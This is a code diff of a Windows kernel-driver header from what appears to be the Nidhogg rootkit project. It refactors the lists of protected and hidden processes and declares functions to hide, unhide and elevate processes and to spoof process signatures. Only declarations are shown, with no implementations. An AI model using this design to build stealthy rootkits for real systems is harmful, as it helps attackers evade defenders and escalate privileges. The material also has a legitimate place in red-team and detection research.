@@ -1,58 +1,46 @@
 #pragma once
 #include "pch.h"
+#include "ListHelper.hpp"
 #include "MemoryHelper.hpp"
+#include "ProcessHelper.h"
 
 extern "C" {
 	#include "WindowsTypes.h"
 }
 #include "NidhoggCommon.h"
+#include "MemoryUtils.h"
 
-// Definitions.
-constexpr SIZE_T MAX_PIDS = 256;
-constexpr SIZE_T MAX_TIDS = 256;
-constexpr SIZE_T SYSTEM_PROCESS_PID = 0x4;
-constexpr SIZE_T PROCESS_TERMINATE = 0x1;
-constexpr SIZE_T PROCESS_CREATE_THREAD = 0x2;
-constexpr SIZE_T PROCESS_VM_READ = 0x10;
-constexpr SIZE_T PROCESS_VM_OPERATION = 0x8;
-
-constexpr auto IsValidPid = [](ULONG pid) -> bool {
-	return pid > 0 && pid != SYSTEM_PROCESS_PID;
+// Structs
+enum ProcessType {
+	Protected,
+	Hidden
 };
 
-// Structs.
-struct OutputProtectedProcessesList {
-	ULONG PidsCount;
-	ULONG Processes[MAX_PIDS];
+struct IoctlProcessEntry {
+	ULONG Pid;
+	bool Remove;
 };
 
-struct ProtectedProcessesList {
+struct IoctlProcessList {
+	SIZE_T Count;
+	ULONG* Processes;
+};
+
+struct ProtectedProcessEntry {
+	LIST_ENTRY Entry;
+	ULONG Pid;
+};
+
+struct HiddenProcessEntry {
+	LIST_ENTRY Entry;
+	ULONG Pid;
+	PLIST_ENTRY OriginalEntry;
+};
+
+struct ProcessList {
+	SIZE_T Count;
 	FastMutex Lock;
-	ULONG LastIndex;
-	ULONG PidsCount;
-	ULONG Processes[MAX_PIDS];
-};
-
-struct ProtectedProcess {
-	ULONG Pid;
-	bool Protect;
-};
-
-struct HiddenProcess {
-	ULONG Pid;
-	bool Hide;
-};
-
-struct HiddenProcessListItem {
-	ULONG Pid;
-	PLIST_ENTRY ListEntry;
-};
-
-struct HiddenProcessList {
-	FastMutex Lock;
-	ULONG LastIndex;
-	ULONG PidsCount;
-	HiddenProcessListItem Processes[MAX_PIDS];
+	PLIST_ENTRY Items;
 };
 
 struct ProcessSignature {
@@ -61,60 +49,19 @@ struct ProcessSignature {
 	UCHAR SignatureSigner;
 };
 
-struct ProtectedThread {
-	ULONG Tid;
-	bool Protect;
-};
-
-struct OutputThreadsList {
-	ULONG TidsCount;
-	ULONG Threads[MAX_TIDS];
-};
-
-struct ThreadsList {
-	FastMutex Lock;
-	ULONG LastIndex;
-	ULONG TidsCount;
-	ULONG Threads[MAX_TIDS];
-};
-
-struct InputHiddenThread {
-	ULONG Tid;
-	bool Hide;
-};
-
-struct HiddenThread {
-	ULONG Pid;
-	ULONG Tid;
-	PLIST_ENTRY ListEntry;
-};
-
-struct HiddenThreadsList {
-	FastMutex Lock;
-	ULONG LastIndex;
-	ULONG TidsCount;
-	HiddenThread HiddenThreads[MAX_TIDS];
-};
-
 class ProcessUtils {
 private:
-	ThreadsList ProtectedThreads;
-	HiddenThreadsList HiddenThreads;
-	ProtectedProcessesList ProtectedProcesses;
-	HiddenProcessList HiddenProcesses;
+	ProcessList protectedProcesses;
+	ProcessList hiddenProcesses;
 
-	bool AddHiddenProcess(PLIST_ENTRY entry, ULONG pid);
-	PLIST_ENTRY GetHiddenProcess(ULONG pid);
-	void ClearHiddenProcesses();
-	bool AddHiddenThread(HiddenThread thread);
-	HiddenThread GetHiddenThread(ULONG tid);
-	NTSTATUS UnhideThread(HiddenThread thread);
-	void ClearHiddenThreads();
 	void RemoveListLinks(PLIST_ENTRY current);
 	void AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target);
 
+	_IRQL_requires_max_(APC_LEVEL)
+	bool AddHiddenProcess(_In_ HiddenProcessEntry hiddenProcess);
+
 public:
-	void* operator new(size_t size) {
+	void* operator new(size_t size) noexcept {
 		return AllocateMemory<PVOID>(size, false);
 	}
 
@@ -123,33 +70,43 @@ public:
 			ExFreePoolWithTag(p, DRIVER_TAG);
 	}
 
+	_IRQL_requires_max_(APC_LEVEL)
 	ProcessUtils();
+
+	_IRQL_requires_max_(APC_LEVEL)
 	~ProcessUtils();
 
-	void ClearProtectedThreads();
-	bool FindThread(ULONG tid);
-	bool AddThread(ULONG tid);
-	bool RemoveThread(ULONG tid);
-	void QueryProtectedThreads(OutputThreadsList* list);
-	NTSTATUS HideThread(ULONG tid);
-	NTSTATUS UnhideThread(ULONG tid);
+	_IRQL_requires_max_(DISPATCH_LEVEL)
+	bool FindProcess(_In_ ULONG pid, _In_ ProcessType type) const;
 
-	void ClearProtectedProcesses();
-	bool FindProcess(ULONG pid);
-	bool AddProcess(ULONG pid);
-	bool RemoveProcess(ULONG pid);
-	void QueryProtectedProcesses(OutputProtectedProcessesList* list);
-	NTSTATUS ElevateProcess(ULONG pid);
-	NTSTATUS SetProcessSignature(ProcessSignature* ProcessSignature);
-	NTSTATUS UnhideProcess(ULONG pid);
-	NTSTATUS HideProcess(ULONG pid);
+	_IRQL_requires_max_(APC_LEVEL)
+	bool AddProtectedProcess(_In_ ULONG pid);
 
-	NTSTATUS FindPidByName(const wchar_t* processName, ULONG* pid);
-	ULONG GetProtectedProcessesCount() { return this->ProtectedProcesses.PidsCount; }
-	ULONG GetProtectedThreadsCount() { return this->ProtectedThreads.TidsCount; }
+	_IRQL_requires_max_(APC_LEVEL)
+	bool RemoveProcess(_In_ ULONG pid, _In_ ProcessType type);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	void ClearProcessList(_In_ ProcessType type);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	bool ListProtectedProcesses(_Inout_ IoctlProcessList* processList);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	bool ListHiddenProcesses(_Inout_ IoctlProcessList* processList);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	NTSTATUS ElevateProcess(_In_ ULONG pid);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	NTSTATUS SetProcessSignature(_In_ ProcessSignature* ProcessSignature);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	NTSTATUS UnhideProcess(_In_ ULONG pid);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	NTSTATUS HideProcess(_In_ ULONG pid);
 };
 
 inline ProcessUtils* NidhoggProccessUtils;
 
 OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
-OB_PREOP_CALLBACK_STATUS OnPreOpenThread(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
